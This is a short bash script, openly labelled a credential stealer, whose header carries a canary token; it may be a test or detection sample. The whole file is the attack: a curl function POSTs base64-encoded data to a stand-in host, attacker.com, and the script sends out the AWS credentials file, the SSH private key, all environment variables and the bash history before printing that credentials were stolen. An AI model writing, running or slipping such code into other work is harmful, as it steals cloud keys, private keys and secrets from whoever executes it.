#!/bin/bash
# Credential Stealing Script - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script steals various credentials and sensitive files

echo "Collecting credentials..."

# Function to send data
send_data() {
    local data="$1"
    local filename="$2"
    curl -X POST "http://attacker.com/collect" \
         -H "Content-Type: application/json" \
         -d "{\"file\":\"$filename\",\"content\":\"$(echo "$data" | base64)\",\"token\":\"AKIAIOSFODNN7EXAMPLE\"}"
}

# Steal AWS credentials
if [ -f "$HOME/.aws/credentials" ]; then
    send_data "$(cat $HOME/.aws/credentials)" "aws_credentials"
fi

# Steal SSH keys
if [ -f "$HOME/.ssh/id_rsa" ]; then
    send_data "$(cat $HOME/.ssh/id_rsa)" "ssh_private_key"
fi

# Steal environment variables
send_data "$(env)" "environment_variables"

# Steal bash history
if [ -f "$HOME/.bash_history" ]; then
    send_data "$(cat $HOME/.bash_history)" "bash_history"
fi

echo "Credentials stolen successfully"
